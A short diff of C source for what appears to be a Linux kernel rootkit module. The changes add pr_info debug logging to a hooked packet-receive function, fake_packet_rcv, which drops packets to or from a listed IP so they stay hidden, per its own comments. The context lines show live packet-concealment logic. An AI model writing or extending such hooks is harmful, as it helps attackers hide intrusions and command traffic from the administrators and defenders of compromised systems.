@@ -933,6 +933,7 @@ int packet_check(struct sk_buff *skb)
 		*/
 		if(header->saddr == *(unsigned int *)drop_ip || header->daddr == *(unsigned int *)drop_ip){
 			//debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+			pr_info("SE DETECTO 127.0.0.1 FILTRANDO\n");
 
 			/* ip in list, should be hidden */
 			return 1;
@@ -953,7 +954,8 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
-		//debug("PACKET DROP");
+		//debug("PACKET DROP");	
+		pr_info("PACKET DROP\n");
 		//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 		return NF_DROP;
 	}
@@ -975,6 +977,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 
 	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 	//debug("PACKET ACCEPT");
+	pr_info("PACKET ACCEPT\n");
 
 	return ret;
 }
